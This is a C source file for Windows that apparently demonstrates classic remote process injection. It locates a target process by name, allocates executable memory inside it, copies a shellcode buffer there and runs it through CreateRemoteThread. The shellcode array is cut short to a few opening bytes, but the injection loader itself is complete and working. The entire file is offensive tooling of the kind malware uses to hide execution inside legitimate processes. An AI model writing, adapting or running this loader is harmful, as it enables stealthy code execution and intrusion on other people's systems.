#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	// 0x41, 0x50, 0x52, ...
};
unsigned int len = sizeof(shellcode);

int findProcess(const char* procname) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;
	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);
	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {
	HANDLE process_handle; // process handle
	HANDLE remote_thread; // remote thread
	PVOID remote_buffer; // remote buffer

	// find process
	printf("%-15s : %s\n", "Process name", argv[1]);
	printf("%-15s : %d\n", "PID", findProcess(argv[1]));
	process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(findProcess(argv[1])));
	if (process_handle == NULL){
        printf("Process not found!");
        return 0;
    }
	printf("Process opened...\n");

	// allocate memory buffer for remote process
	remote_buffer = VirtualAllocEx(process_handle, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (remote_buffer == NULL) return 0;
	printf("%-15s : 0x%-016p\n", "alloc_mem addr", (void*)remote_buffer);

	// write code in another process memory
	if (!WriteProcessMemory(process_handle, remote_buffer, shellcode, len, NULL)) return 0;

	printf("Press Enter to Create Thread!\n");
	getchar();

	// start new thread in another process
	remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
	CloseHandle(process_handle);
	return 0;
}